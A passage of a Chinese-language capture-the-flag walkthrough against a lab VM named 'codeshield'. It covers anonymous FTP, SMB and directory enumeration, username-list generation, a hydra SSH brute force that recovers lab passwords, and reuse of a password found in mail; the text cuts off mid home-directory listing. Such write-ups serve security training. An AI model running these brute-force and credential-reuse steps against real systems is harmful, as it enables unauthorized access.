Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">48.10</span> seconds</code></pre>
<p>开了好多端口，整理一下<code>21 22 25 80 100 143 443 465 587 993 995 2222 3389 22222</code><br>先从21端口看</p>
<h3 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.154                                      </span>
Connected to <span class="token number">192.168</span>.56.154.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.5<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.154:root<span class="token punctuation">)</span>: Anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">50231</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">137</span>          <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">137</span>          <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1002</span>     <span class="token number">1002</span>      <span class="token number">2349914</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> CodeShield_pitch_deck.pdf
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1003</span>     <span class="token number">1003</span>        <span class="token number">67520</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Information_Security_Policy.pdf
-rw-rw-r--    <span class="token number">1</span> <span class="token number">1004</span>     <span class="token number">1004</span>       <span class="token number">226435</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> The_2023_weak_password_report.pdf
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get 
CodeShield_pitch_deck.pdf               Information_Security_Policy.pdf         The_2023_weak_password_report.pdf
ftp<span class="token operator">></span> get CodeShield_pitch_deck.pdf
local: CodeShield_pitch_deck.pdf remote: CodeShield_pitch_deck.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">17533</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> CodeShield_pitch_deck.pdf <span class="token punctuation">(</span><span class="token number">2349914</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span>  <span class="token number">2294</span> KiB   <span class="token number">95.91</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">2349914</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">82.59</span> MiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get Information_Security_Policy.pdf
local: Information_Security_Policy.pdf remote: Information_Security_Policy.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">57398</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> Information_Security_Policy.pdf <span class="token punctuation">(</span><span class="token number">67520</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span> <span class="token number">67520</span>        <span class="token number">9.87</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">67520</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">9.01</span> MiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get The_2023_weak_password_report.pdf
local: The_2023_weak_password_report.pdf remote: The_2023_weak_password_report.pdf
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">10209</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> The_2023_weak_password_report.pdf <span class="token punctuation">(</span><span class="token number">226435</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">221</span> KiB   <span class="token number">23.68</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">226435</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">20.47</span> MiB/s<span class="token punctuation">)</span></code></pre>
<p>有三个pdf文件，get下来看一下<br>第一个pdf下面有个用户名和邮箱<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXJsG.png" alt="OmXJsG.png" loading="lazy"><br>第二个pdf打开没什么有用信息<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXRo1.png" alt="OmXRo1.png" loading="lazy"><br>第三个pdf打开可以看到一些弱口令<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXteI.png" alt="OmXteI.png" loading="lazy"><br>保存下来<br>21端口就看到这</p>
<h3 id="smb枚举"><a href="#smb枚举" class="headerlink" title="smb枚举"></a>smb枚举</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># enum4linux 192.168.56.154                                   </span>
Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Wed Apr <span class="token number">17</span> <span class="token number">10</span>:22:01 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
                                                                                                                                                                                                                                                      
Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.56.154                                                                                                                                                                                                                     
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span>.56.154 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      
<span class="token punctuation">[</span>E<span class="token punctuation">]</span> Can<span class="token string">'t find workgroup/domain                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      

 ===============================( Nbtstat Information for 192.168.56.154 )===============================
                                                                                                                                                                                                                                                      
Looking up status of 192.168.56.154                                                                                                                                                                                                                   
No reply from 192.168.56.154

 ==================================( Session Check on 192.168.56.154 )==================================
                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                      
[E] Server doesn'</span>t allow session using username <span class="token string">''</span>, password <span class="token string">''</span><span class="token builtin class-name">.</span>  Aborting remainder of tests.    </code></pre>
<p>无果</p>
<h3 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h3><p><img src="https://ooo.0x0.ooo/2024/04/17/OmX4GD.png" alt="OmX4GD.png" loading="lazy"><br>源码看了一下没什么有用的地方,不够浏览一下功能发现有很多的用户名<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXD3F.png" alt="OmXD3F.png" loading="lazy"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u https://192.168.56.154</span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3                                                                                                                                                                                                                      
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                      
Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">11460</span>

Output File: /root/Desktop/reports/https_192.168.56.154/_24-04-17_10-31-04.txt

Target: https://192.168.56.154/

<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> Starting:                                                                                                                                                                                                                                  
<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /%2e%2e<span class="token punctuation">;</span>/test
<span class="token punctuation">[</span><span class="token number">10</span>:31:04<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /js  -<span class="token operator">></span>  https://192.168.56.154/js/               
<span class="token punctuation">[</span><span class="token number">10</span>:31:10<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /.well-known/caldav  -<span class="token operator">></span>  https://192.168.56.154/SOGo/dav
<span class="token punctuation">[</span><span class="token number">10</span>:31:10<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /.well-known/carddav  -<span class="token operator">></span>  https://192.168.56.154/SOGo/dav
<span class="token punctuation">[</span><span class="token number">10</span>:31:15<span class="token punctuation">]</span> <span class="token number">200</span> -   27KB - /about.html                                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:16<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admin/.config                                    
<span class="token punctuation">[</span><span class="token number">10</span>:31:19<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admrev/.ftppass                                  
<span class="token punctuation">[</span><span class="token number">10</span>:31:19<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /admpar/.ftppass                                  
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings                                 
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.php                             
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.php.bak                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:21<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /bitrix/.settings.bak                             
<span class="token punctuation">[</span><span class="token number">10</span>:31:23<span class="token punctuation">]</span> <span class="token number">200</span> -   19KB - /contact.html                                     
<span class="token punctuation">[</span><span class="token number">10</span>:31:23<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /css  -<span class="token operator">></span>  https://192.168.56.154/css/             
<span class="token punctuation">[</span><span class="token number">10</span>:31:25<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /ext/.deps                                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:25<span class="token punctuation">]</span> <span class="token number">200</span> -   34KB - /favicon.ico                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:27<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /img  -<span class="token operator">></span>  https://192.168.56.154/img/             
<span class="token punctuation">[</span><span class="token number">10</span>:31:27<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /js/                                              
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.flexProperties                
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.project                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /lib  -<span class="token operator">></span>  https://192.168.56.154/lib/
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.actionScriptProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.flexLibProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.settings
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/uploader/.actionScriptProperties
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.settings                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /lib/flex/varien/.project                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">200</span> -    1KB - /LICENSE.txt                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:28<span class="token punctuation">]</span> <span class="token number">200</span> -    5KB - /iredadmin                                        
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">301</span> -  162B  - /mail  -<span class="token operator">></span>  https://192.168.56.154/mail/           
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /mailer/.env                                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:29<span class="token punctuation">]</span> <span class="token number">200</span> -    5KB - /mail/                                            
<span class="token punctuation">[</span><span class="token number">10</span>:31:30<span class="token punctuation">]</span> <span class="token number">502</span> -  552B  - /Microsoft-Server-ActiveSync/                     
<span class="token punctuation">[</span><span class="token number">10</span>:31:30<span class="token punctuation">]</span> <span class="token number">401</span> -  574B  - /netdata/                                         
<span class="token punctuation">[</span><span class="token number">10</span>:31:31<span class="token punctuation">]</span> <span class="token number">303</span> -    0B  - /newsletter/  -<span class="token operator">></span>  https://192.168.56.154/iredadmin/newsletter
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /resources/.arch-internal-preview.css             
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /resources/sass/.sass-cache/                      
<span class="token punctuation">[</span><span class="token number">10</span>:31:34<span class="token punctuation">]</span> <span class="token number">200</span> -   26B  - /robots.txt                                       
<span class="token punctuation">[</span><span class="token number">10</span>:31:36<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /status                                           
<span class="token punctuation">[</span><span class="token number">10</span>:31:36<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /status?full<span class="token operator">=</span>true                                 
<span class="token punctuation">[</span><span class="token number">10</span>:31:38<span class="token punctuation">]</span> <span class="token number">403</span> -  548B  - /twitter/.env                                     
                                                                             
Task Completed                                                          </code></pre>
<p>有个mail和iredadmin都可以登录<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXVrK.png" alt="OmXVrK.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/17/OmXYQa.png" alt="OmXYQa.png" loading="lazy"><br>测试发现iredadmin是个后台登录界面,测试了一下弱口令登不上去，应该使用之前获得的用户名和密码爆破</p>
<h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><h3 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h3><p>先考虑在ssh爆破<br>由于用户名是姓和名一起的，用一款工具根据姓名生成字典</p>
<blockquote>
<p>工具: <a target="_blank" rel="noopener" href="https://github.com/w0Tx/generate-ad-username">https://github.com/w0Tx/generate-ad-username</a></p>
</blockquote>
<p>先把姓氏中间用逗号隔开</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat user.txt </span>
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchel
Patrick,Early
John,Doe
Kevin,Valdez</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/generate-ad-username<span class="token punctuation">]</span>
└─<span class="token comment"># python ADGenerator.py ../user.txt >users.txt     </span>
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/generate-ad-username<span class="token punctuation">]</span>
└─<span class="token comment"># mv users.txt ../                                  </span></code></pre>
<h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>有三个端口有ssh服务分别测一下最后测出22222端口能登陆</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hydra -L users.txt -P passes.txt 192.168.56.154 ssh -s 22222</span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:51:13
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="token parameter variable">-t</span> <span class="token number">4</span>
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">16</span> tasks per <span class="token number">1</span> server, overall <span class="token number">16</span> tasks, <span class="token number">1680</span> login tries <span class="token punctuation">(</span>l:168/p:10<span class="token punctuation">)</span>, ~105 tries per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://192.168.56.154:22222/
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">276.00</span> tries/min, <span class="token number">276</span> tries <span class="token keyword">in</span> 00:01h, <span class="token number">1407</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:06h, <span class="token number">13</span> active
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">241.33</span> tries/min, <span class="token number">724</span> tries <span class="token keyword">in</span> 00:03h, <span class="token number">961</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:04h, <span class="token number">11</span> active
<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> <span class="token number">225.57</span> tries/min, <span class="token number">1579</span> tries <span class="token keyword">in</span> 00:07h, <span class="token number">106</span> to <span class="token keyword">do</span> <span class="token keyword">in</span> 00:01h, <span class="token number">11</span> active
<span class="token punctuation">[</span><span class="token number">22222</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: <span class="token number">192.168</span>.56.154   login: valdezk   password: Greatplace2work<span class="token operator">!</span>
<span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Writing restore <span class="token function">file</span> because <span class="token number">8</span> final worker threads did not complete <span class="token keyword">until</span> end.
<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">8</span> targets did not resolve or could not be connected
<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">0</span> target did not complete
Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2024</span>-04-17 <span class="token number">10</span>:58:41</code></pre>
<p>拿到一组账号密码 <code>valdezk:Greatplace2work!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh valdezk@192.168.56.154 -p 22222</span>
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          <span class="token punctuation">(</span>@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 <span class="token operator">|</span>  _WARNING: This system is restricted to authorized users<span class="token operator">!</span>___________________________________________  <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>                                                                                                   <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span> IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>                                                                                                   <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span> This system is restricted to authorized users.                                                    <span class="token operator">|</span> <span class="token operator">|</span> 
 <span class="token operator">|</span> <span class="token operator">|</span> Individuals <span class="token function">who</span> attempt unauthorized access will be prosecuted.                                   <span class="token operator">|</span> <span class="token operator">|</span> 
 <span class="token operator">|</span> <span class="token operator">|</span> If you<span class="token string">'re unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@192.168.56.154'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.3 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-79-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr <span class="token number">17</span> 03:00:22 AM UTC <span class="token number">2024</span>

  System load:  <span class="token number">0.0908203125</span>       Processes:               <span class="token number">237</span>
  Usage of /:   <span class="token number">28.6</span>% of <span class="token number">47</span>.93GB   Users logged in:         <span class="token number">0</span>
  Memory usage: <span class="token number">60</span>%                IPv4 address <span class="token keyword">for</span> enp0s3: <span class="token number">192.168</span>.56.154
  Swap usage:   <span class="token number">0</span>%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar <span class="token keyword">for</span> easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance <span class="token keyword">for</span> Applications is not enabled.

<span class="token number">10</span> updates can be applied immediately.
To see these additional updates run: <span class="token function">apt</span> list <span class="token parameter variable">--upgradable</span>

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="token function">sudo</span> pro status


The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr <span class="token number">17</span> 02:54:31 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
valdezk@codeshield:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1007</span><span class="token punctuation">(</span>valdezk<span class="token punctuation">)</span></code></pre>
<h2 id="横向尝试"><a href="#横向尝试" class="headerlink" title="横向尝试"></a>横向尝试</h2><p>登录之后也没有user flag，尝试登录web的mail和iredadmin<br>iredadmin登录失败,不过mail可以登上去<br>邮箱根据前面pdf获得的格式构造出valdez的邮箱<code>k.valdez@codeshield.hmv</code><br>登录之后打开邮件就发现了thomas的密码<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png" alt="OmXf3S.png" loading="lazy"><br><code>D@taWh1sperer!</code><br>根据thomas的名字以及home下面用户登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat user.txt </span>
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchel
Patrick,Early
John,Doe
Kevin,Valdez</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">56</span>
drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root      root      <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-x--- <span class="token number">16</span> carlsonj  carlsonj  <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> carlsonj
drwxr-x--- <span class="token number">15</span> coccia    coccia    <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> coccia
drwxr-x---  <span class="token number">5</span> cowrie    cowrie    <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> cowrie
drwxr-x--- <span class="token number">19</span> earlyp    earlyp    <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> earlyp
